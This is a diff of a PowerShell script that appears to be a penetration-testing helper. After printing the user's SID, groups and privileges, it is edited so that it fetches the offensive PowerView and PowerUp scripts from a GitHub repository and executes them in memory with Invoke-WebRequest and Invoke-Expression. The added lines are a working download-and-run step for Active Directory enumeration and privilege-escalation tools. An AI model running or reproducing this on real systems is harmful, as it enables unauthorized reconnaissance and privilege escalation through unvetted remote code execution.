@@ -21,22 +21,22 @@ Write-Host "SID: $sid"
 Write-Host "Groups:`n$($groups -join "`n")"
 Write-Host "Privileges:`n$($privileges -join "`n")"
 
-# Import powerview and powerup scripts from GitHub repository
-$scriptDir = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(".\")
+# Import powerview and powerup scripts 
+
 try {
-    $powerviewContent = Invoke-WebRequest -Uri "ttps://raw.githubusercontent.com/conma293/mvp/main/powerview.ps1" -UseBasicParsing -ErrorAction Stop
-    Invoke-Expression $powerviewContent.Content
-    Write-Host "Powerview loaded successfully"
-}
-catch {
-    Write-Host "Could not load powerview"
+    $pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/conma293/mvp/main/PowerView.ps1' -UseBasicParsing
+    Invoke-Expression $($pwContent.Content)
+    Import-Module PowerView
+    Write-Output "Powerview loaded"
+} catch {
+    Write-Output "Could not load Powerview"
 }
 
 try {
-    $powerupContent = Invoke-WebRequest -Uri "ttps://raw.githubusercontent.com/conma293/mvp/main/powerup.ps1" -UseBasicParsing -ErrorAction Stop
-    Invoke-Expression $powerupContent.Content
-    Write-Host "Powerup loaded successfully"
-}
-catch {
-    Write-Host "Could not load powerup"
+    $puContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/conma293/mvp/main/PowerUp.ps1' -UseBasicParsing
+    Invoke-Expression $($puContent.Content)
+    Import-Module PowerUp
+    Write-Output "PowerUp loaded"
+} catch {
+    Write-Output "Could not load PowerUp"
 }
